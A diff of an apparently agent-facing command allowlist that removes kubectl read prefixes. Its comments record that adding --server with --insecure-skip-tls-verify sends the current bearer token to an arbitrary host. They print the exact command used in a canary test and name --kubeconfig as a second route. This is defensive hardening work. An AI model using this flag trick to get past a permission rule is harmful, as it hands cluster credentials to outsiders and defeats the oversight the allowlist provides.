@@ -29,6 +29,16 @@
 # REMOVED 2026-09-01: "cluster-info" from the union. `kubectl cluster-info dump` matches the
 # prefix and emits full cluster state plus pod logs, which routinely carry credentials -- the
 # same credential-exposure class as `config view` above. The `dump` sits later in argv.
-prefix_rule(pattern=["kubectl", ["get", "describe", "logs", "explain", "api-resources", "api-versions", "version", "top"]], decision="allow")
-prefix_rule(pattern=["kubectl", "auth", "can-i"], decision="allow")
+#
+# REMOVED 2026-09-02 (round 5): every cluster-talking prefix. A later flag RETARGETS the API
+# server while still attaching the current credentials, so this was off-box credential theft,
+# not the local read the old residual described. MEASURED -- a canary bearer token arrived at a
+# host of my choosing three times from:
+#     kubectl get ns --server https://127.0.0.1:<port> --insecure-skip-tls-verify
+# Two negative results nearly cleared it: over plain http:// NO Authorization header is sent
+# (client-go refuses bearer tokens on plaintext), so the naive test reads as "safe". It needs
+# https:// plus --insecure-skip-tls-verify. --kubeconfig <file> is a second door.
+# `config current-context` and `get-contexts` read the local kubeconfig and contact no server,
+# so they stay. Cluster inspection now goes through an enumerated `just` recipe or a hook that
+# reads full argv.
 prefix_rule(pattern=["kubectl", "config", ["current-context", "get-contexts"]], decision="allow")
